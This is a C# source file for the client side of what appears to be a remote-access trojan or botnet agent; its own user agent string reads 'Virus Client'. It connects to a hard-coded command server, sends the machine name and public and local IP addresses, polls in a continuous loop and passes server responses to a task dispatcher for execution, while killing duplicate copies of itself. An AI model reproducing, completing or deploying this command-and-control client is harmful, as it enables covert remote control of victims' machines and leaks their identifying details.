using CommandSpace;
using NamesSpace;
using ResponseBuilderSpace;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using TasksSpace;
using ToolsSpace;

public class Client {

    public static readonly float SCREENSHOT_SCALE_FACTOR = 0.5f;

    private static readonly string MACHINE_NAME = Environment.MachineName;
    private readonly string IP;
    private readonly string LOCAL_IP;

    private static readonly string SERVER_IP = "http://192.168.178.21:1234";
    private static readonly string LOGIN_CONTEXT = "login";
    private static readonly string UPDATE_CONTEXT = "update";

    private static readonly int DELAY = 0;
    private static readonly int TIMEOUT = 6*1000;

    private bool isRunning = true, isLoggedIn = false, useThreads = true;

    private readonly ResponseBuilder ResponseBuilder = new ResponseBuilder();
    private readonly ResponseBuilder ResponseBuilderWithoutServerResponse = new ResponseBuilder();

    public static string SEPERATOR = ":::", LINE_SEPERATOR = "%LS%";


    public static void Main(string[] args) {
        new Client();
    }

    private Client() {
        WaitForInternetConnection();
        
        try {
            IP = GetPublicIP();
            LOCAL_IP = GetLocalIP();
        } catch (Exception e) {
            Logger.Log(e.GetType() + ": " + e.Message);
        }

        Logger.Log("Client running...");

        Login();
        StartTimer();
    }

    private void WaitForInternetConnection() {
        do {
            Logger.Log("Waiting for internet connection...");
        } while (!HasInternetConnection());
    }

    public void Login() {
        ResponseBuilder.id(getID());
        string text = ResponseBuilder.Build();
        ResponseBuilder.Clear();

        string response = SendRequest(LOGIN_CONTEXT, text);
        if (!response.Equals("OK")) {
            Logger.Log("Login failed: " + response);
        } else {
            Logger.Log("Login successful");
            isLoggedIn = true;
        }
    }

    public void StartTimer() {
        /*while(true) {
            Update();
            Thread.Sleep(100);
        }*/

        Task t = Task.Run(async () => {
            while (isRunning) {
                Update();
                await Task.Delay(DELAY);
            }
        });
        t.Wait();
    }

    private void Update() {
        TerminateOtherClients();

        if (!isLoggedIn) {
            Login();
            return;
        }

        //With Response
        ResponseBuilder.id(getID());
        string text = ResponseBuilder.Build();
        ResponseBuilder.Clear();

        string response = SendRequest(UPDATE_CONTEXT, text);
        new Tasks(response, ResponseBuilder, ResponseBuilderWithoutServerResponse).Invoke();

        new Thread(() => {
            Stopwatch s = Stopwatch.StartNew();
            //Without Response
            ResponseBuilderWithoutServerResponse.id(getID());
            ResponseBuilderWithoutServerResponse.sendresponse(false);
            string text2 = ResponseBuilderWithoutServerResponse.Build();
            ResponseBuilderWithoutServerResponse.Clear();

            string response2 = SendRequest(UPDATE_CONTEXT, text2);
            s.Stop();
            Console.WriteLine(s.ElapsedMilliseconds);
        }).Start();
    }

    private void TerminateOtherClients() {
        Process[] processes = Process.GetProcessesByName(Names.CLIENT);
        Process processWithGreatestID = null;
        foreach (Process process in processes) {
            if (processWithGreatestID == null || process.Id > processWithGreatestID.Id) {
                processWithGreatestID = process;
            }
        } foreach(Process process in processes) {
            if(process.Id != processWithGreatestID.Id && process.Id != Process.GetCurrentProcess().Id) {
                process.Kill();
            }
        }
        if (processWithGreatestID.Id != Process.GetCurrentProcess().Id) {
            Process.GetCurrentProcess().Kill();
        }
    }

    public string SendRequest(string context, string text) {
        try {
            // Create byte list
            byte[] byteArray = Tools.EncodeToASCII(text);

            // Send request
            WebRequest request = WebRequest.Create(SERVER_IP + "/" + context);
            request.Timeout = TIMEOUT;
            request.Credentials = CredentialCache.DefaultCredentials;
            ((HttpWebRequest)request).UserAgent = "Virus Client";
            request.Method = "POST";
            request.ContentLength = byteArray.Length;
            request.ContentType = "application/x-www-form-urlencoded";

            // Write byte array
            Stream dataStream = request.GetRequestStream();
            dataStream.Write(byteArray, 0, byteArray.Length);
            dataStream.Close();

            // Get response
            WebResponse response = request.GetResponse();
            dataStream = response.GetResponseStream();

            // Read response
            StreamReader reader = new StreamReader(dataStream);
            string responseString = reader.ReadToEnd();

            // Close streams
            reader.Close();
            dataStream.Close();
            response.Close();

            return responseString;
        } catch (Exception e) {
            if (HasInternetConnection()) {
                // Servers problem
                if (e.GetType().ToString().Equals("System.Net.WebException")) {
                    // Server offline
                    isLoggedIn = false;
                    return "Server not reachable (" + e.GetType() + ": " + e.Message + ")";
                }
                // Other error
                return e.GetType() + ": " + e.Message;
            } else {
                // Client offline
                isLoggedIn = false;
                return "No internet connection";
            }
        }
    }

    public string getID() {
        return MACHINE_NAME + "," + IP + "," + LOCAL_IP;
    }

    public string GetLocalIP() {
        var host = Dns.GetHostEntry(Dns.GetHostName());
        foreach (var ip in host.AddressList) {
            if (ip.AddressFamily == AddressFamily.InterNetwork) {
                return ip.ToString();
            }
        }
        throw new Exception("No network adapters with an IPv4 address in the system!");
    }

    public string GetPublicIP() {
        return new WebClient().DownloadString("http://icanhazip.com").Replace("\n", "");
    }

    public bool HasInternetConnection() {
        try {
            byte[] byteArray = Tools.EncodeToASCII("");

            WebRequest request = WebRequest.Create("http://icanhazip.com");
            request.Timeout = 4000;
            request.Credentials = CredentialCache.DefaultCredentials;
            ((HttpWebRequest)request).UserAgent = "Test Client";
            request.Method = "POST";
            request.ContentLength = byteArray.Length;
            request.ContentType = "application/x-www-form-urlencoded";

            Stream dataStream = request.GetRequestStream();
            dataStream.Write(byteArray, 0, byteArray.Length);
            dataStream.Close();

            WebResponse response = request.GetResponse();
            dataStream = response.GetResponseStream();

            StreamReader reader = new StreamReader(dataStream);
            string responseString = reader.ReadToEnd();

            reader.Close();
            dataStream.Close();
            response.Close();
            return true;
        } catch (Exception e) {
            Logger.Log(e.GetType() + ": " + e.Message);
            return false;
        }
    }

}
